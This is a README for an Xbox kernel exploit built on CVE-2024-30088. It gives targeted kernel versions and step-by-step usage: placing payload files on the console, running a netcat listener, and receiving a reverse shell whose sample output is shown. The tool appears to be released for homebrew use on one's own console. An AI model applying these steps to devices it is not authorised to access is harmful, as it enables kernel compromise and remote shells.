# Collateral Damage
Collateral Damage is a kernel exploit for Xbox SystemOS using [CVE-2024-30088](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-30088).
It targets Xbox One and Xbox Series consoles running kernel versions 25398.4478, 25398.4908, and 25398.4909. The initial entrypoint is via the Game Script UWP application.

This exploit was developed by [Emma Kirkpatrick](https://x.com/carrot_c4k3) (vulnerability discovery & exploitation) and [Lander Brandt](https://x.com/landaire) (PE loader development)

## Important Caveats
This initial release is largely intended for developers. Currently a way to place files into the `LocalState` directory of Game Script is required via an app such as [Adv File Explorer (FullTrust)](https://apps.microsoft.com/detail/9nbnjpsxfsqb). 
This is due to the requirement of placing the `stage2.bin` and `run.exe` files onto into the `LocalState` directory. In the near future a payload will be supplied which will load those files over the network, so the initial payload will simply be 
a script which can be inputted via a USB keyboard emulator.

The reverse shell example provided here requires that your console is connected to a network. When connecting your console to a network be very careful to avoid connecting to the internet and updating. Try to block connectivity to Xbox LIVE as 
much as possible, at the very least by setting your DNS to invalid servers.

## Usage
- Modify line 7 of `gamescript_autosave.txt` to contain the local IP of your PC.
- Copy `gamescript_autosave.txt`, `stage2.bin`, and `run.exe` to the `LocalState` directory of the Game Script application on your Console (`Q:\Users\UserMgr0\AppData\Local\Packages\27878ConstantineTarasenko.458004FD2C47C_c8b3w9r5va522\LocalState\`)
- Listen on port 7070 on your PC using netcat or a similar tool (command example: `nc64.exe -lvnp 7070`)
- Open the Game Script application on your console and select "Show Code Run window" and click "Run code once"
- If the exploit is success you should see output on your PC that resembles the following:
```
listening on [any] 7070 ...
connect to [192.168.0.61] from (UNKNOWN) [192.168.0.130] 49665
Collateral Damage - @carrot_c4k3 & @landaire (exploits.forsale)
Build number: 25398.4478
Attempting to find kernel base...
Found likely kernel base: FFFFF80AF9800000
Attempting exploit...
Exploit succeeded! Running payload!

Microsoft Windows [Version 10.0.25398.4478]
Copyright (c) Microsoft Corporation. All rights reserved.

S:\>
```
